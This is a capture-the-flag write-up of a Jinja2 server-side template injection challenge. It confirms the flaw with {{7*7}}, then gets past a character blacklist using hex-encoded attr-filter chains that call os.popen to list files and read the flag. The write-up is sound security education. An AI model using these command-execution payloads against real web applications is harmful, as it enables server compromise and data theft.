---
title: "SSTI2 | CyLab | Writeup"
description: "Challenge Overview"
pubDate: "Oct 09 2026"
heroImage: "/post_img.webp"
badge: "CTF"
tags: ["ctf-writeup", "ctf", "cyber-security-awareness", "technology", "cybersecurity"]
---

*Original article published on [Medium - SiapaHeker](https://siapaheker.medium.com/ssti2-cylab-writeup-6f5e22271682?source=rss-cdf10c641546------2)*

Challenge Overview

![Image](https://cdn-images-1.medium.com/max/664/1*qwmP8cMrFgMEA93G6KD0DA.png)

*challenge overview*

Hints:

- Server Side Template Injection
- Why is blacklisting characters a bad idea to sanitize input?

First, the website landing page looks as shown in the image above, featuring an input field:

![Image](https://cdn-images-1.medium.com/max/590/1*H5ijafXzt7Vz69ubUC1v1g.png)

*website landing page*

Based on the provided clue pointing to **Server-Side Template Injection (SSTI)**, we test the input field using **{{7*7}}**.

![Image](https://cdn-images-1.medium.com/max/883/1*RlVUx2PFxIIz8ui8abcxHg.png)

*ssti test output*

The page returns **49**, confirming that the website is indeed vulnerable to SSTI. Next, we attempt directory listing using the following payload:

![Image](https://cdn-images-1.medium.com/max/582/1*a0tg9sphewCJRGiLMPGM3g.png)

![Image](https://cdn-images-1.medium.com/max/1024/1*VcRvbejFH5tXtQvUAhKZuw.png)

*ssti blacklist output*

However, the output returns **“Stop trying to break me >:(“**. This brings us to the second clue: **blacklisting**. Since the application relies solely on a character blacklist for defense, we can bypass it by combining hex-encoded strings with Jinja2 filters via the pipe operator (|). *The pipe operator *|* passes the value on the left as the first argument to the filter function on the right, allowing us to chain method calls dynamically without restricted characters*

```
{{request
|attr('application')
|attr('\x5f\x5fglobals\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
|attr('popen')('ls')
|attr('read')()}}
```
With this bypass payload, the blacklist controls are completely rendered ineffective.

The response successfully yields the server’s directory listing:

![Image](https://cdn-images-1.medium.com/max/1024/1*o4zTv0uBLtQuyjTApYVQew.png)

*directory listing output*

Now that we know the flag file name, we can adapt the payload to read its content by replacing ls with cat flag.

Payload:

```
{{request
|attr('application')
|attr('\x5f\x5fglobals\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
|attr('popen')('cat flag')
|attr('read')()}}
```
![Image](https://cdn-images-1.medium.com/max/1024/1*WNW7_QaGBud82VLXa_yh7g.png)

*flag output*

and there we go, we got the flag!!

![Image](https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=6f5e22271682)
